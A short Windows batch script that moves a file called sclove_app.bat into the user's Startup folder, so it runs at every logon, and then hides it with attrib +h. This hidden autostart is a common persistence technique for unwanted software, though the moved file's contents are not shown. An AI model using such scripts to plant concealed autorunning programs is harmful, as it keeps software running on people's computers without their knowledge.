@echo off
set "source=%~dp0sclove_app.bat"
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
move "%source%" "%startup%\"
attrib +h "%startup%\sclove_app.bat"
pause
